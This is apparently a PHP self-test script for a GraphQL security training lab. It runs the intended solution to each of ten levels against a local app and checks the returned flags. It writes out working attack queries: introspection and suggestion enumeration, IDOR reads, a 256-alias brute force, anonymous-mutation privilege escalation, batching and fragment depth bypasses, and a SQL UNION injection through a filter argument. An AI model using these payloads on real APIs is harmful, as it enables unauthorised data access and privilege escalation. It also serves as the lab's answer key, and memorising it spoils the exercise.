<?php
/**
 * Self-test: runs the intended solution for every level against the live app
 * and reports whether the flag came back. Run inside the container:
 *
 *   docker compose exec web php /var/www/html/solve_check.php
 *
 * Not part of the challenge - it exists so the lab can be regression-tested,
 * and so that "the intended solution works" is a fact rather than a claim.
 */
require_once __DIR__ . '/helpers.php';

$base = 'http://localhost';
$pass = 0;
$fail = 0;

function post(string $url, array $fields): string
{
    $ctx = stream_context_create(['http' => [
        'method'        => 'POST',
        'header'        => "Content-Type: application/x-www-form-urlencoded\r\n",
        'content'       => http_build_query($fields),
        'timeout'       => 15,
        'ignore_errors' => true,
    ]]);
    return (string)@file_get_contents($url, false, $ctx);
}

function check(int $level, string $body, string $how): void
{
    global $pass, $fail;
    $want = gq_flag($level);
    if (strpos($body, $want) !== false) {
        $pass++;
        printf("  PASS  level %-2d %-46s %s\n", $level, $how, $want);
    } else {
        $fail++;
        printf("  FAIL  level %-2d %-46s (expected %s)\n", $level, $how, $want);
    }
}

echo "GraphQL Lab self-test\n---------------------\n";

// The mutation levels change persistent state; start from a known one. The
// reset is sent over HTTP so that the state being reset is the one the web
// server sees, whichever database file it ended up opening.
gq_reset_state();
post("$base/level6.php", ['_reset' => 1]);
post("$base/level10.php", ['_reset' => 1]);

/* 1 - introspection reveals internalMemo, then read the memo ---------------- */
$intro = post("$base/level1.php", ['query' => '{ __type(name: "Query") { fields { name args { name } } } }']);
if (strpos($intro, 'internalMemo') === false) {
    echo "  WARN  level 1  introspection did not list internalMemo\n";
}
check(1, post("$base/level1.php", ['query' => '{ internalMemo(id: 3) { title content } }']),
    'introspect -> internalMemo(id: 3)');

/* 2 - recover two field names from suggestions, then read the pin ----------- */
$s1 = post("$base/level2.php", ['query' => '{ notes }']);
$s2 = post("$base/level2.php", ['query' => '{ staffNotes { pin } }']);
if (strpos($s1, 'staffNotes') === false || strpos($s2, 'onCallPin') === false) {
    echo "  WARN  level 2  the suggestion oracle did not name both fields\n";
}
check(2, post("$base/level2.php", ['query' => '{ staffNotes { area onCallPin } }']),
    'suggestions -> staffNotes.onCallPin');

/* 3 - object-level IDOR ----------------------------------------------------- */
check(3, post("$base/level3.php", ['query' => '{ user(id: 3) { username privateNote } }']),
    'user(id: 3) { privateNote }');

/* 4 - the one field resolver that skips the object decision ----------------- */
check(4, post("$base/level4.php", ['query' => '{ user(id: 1) { apiToken } }']),
    'user(id: 1) { apiToken }');

/* 5 - 256 aliased calls to redeem() inside one request ---------------------- */
$hex   = str_split('0123456789ABCDEF');
$parts = [];
foreach ($hex as $a) {
    foreach ($hex as $b) {
        $parts[] = "a{$a}{$b}: redeem(code: \"{$a}{$b}\") { code ok reward }";
    }
}
check(5, post("$base/level5.php", ['query' => '{ ' . implode(' ', $parts) . ' }']),
    '256 aliases, one request');

/* 6 - anonymous mutation, so the operation-name guard has nothing to check --- */
check(6, post("$base/level6.php", [
    'query'         => 'mutation { promoteUser(id: 5, role: "admin") { username role } }',
    'operationName' => '',
]), 'anonymous mutation -> promoteUser');

/* 7 - the interesting operation in batch position 1 ------------------------- */
check(7, post("$base/level7.php", [
    'query' => '[{"query": "{ me { username } }"}, {"query": "{ auditLog { actor entry } }"}]',
]), 'batch element [1] = auditLog');

/* 8 - fragments recover the depth the counter thought it had removed -------- */
check(8, post("$base/level8.php", [
    'query' => '{ me { manager { ...A } } } '
             . 'fragment A on Employee { manager { ...B } } '
             . 'fragment B on Employee { safe { label combination } }',
]), 'depth 3 counted, depth 5 executed');

/* 9 - UNION through the filter argument ------------------------------------- */
check(9, post("$base/level9.php", [
    'query' => '{ searchDocuments(filter: "x\' UNION SELECT id, secret_note, body FROM documents-- ") '
             . '{ id title } }',
]), 'UNION through filter: String!');

/* 10 - discover, bypass, escalate, then read -------------------------------- */
$disc = post("$base/level10.php", ['query' => '{ __type(name: "Mutation") { fields { name args { name } } } }']);
if (strpos($disc, 'grantRole') === false) {
    echo "  WARN  level 10  introspection did not list grantRole\n";
}
$blocked = post("$base/level10.php", [
    'query'         => 'mutation GrantRole { grantRole(userId: 4, role: "admin") { role } }',
    'operationName' => 'GrantRole',
]);
if (strpos($blocked, '403 Forbidden') === false) {
    echo "  WARN  level 10  the named operation was not blocked, so the guard proves nothing\n";
}
post("$base/level10.php", [
    'query'         => 'mutation { grantRole(userId: 4, role: "admin") { username role } }',
    'operationName' => '',
]);
check(10, post("$base/level10.php", ['query' => '{ adminSettings { region vaultKey } }']),
    'introspect -> anonymous mutation -> vaultKey');

/* Leave the lab in its starting state for the next visitor. ----------------- */
gq_reset_state();
post("$base/level6.php", ['_reset' => 1]);
post("$base/level10.php", ['_reset' => 1]);

echo "---------------------\n$pass passed, $fail failed\n";
exit($fail === 0 ? 0 : 1);
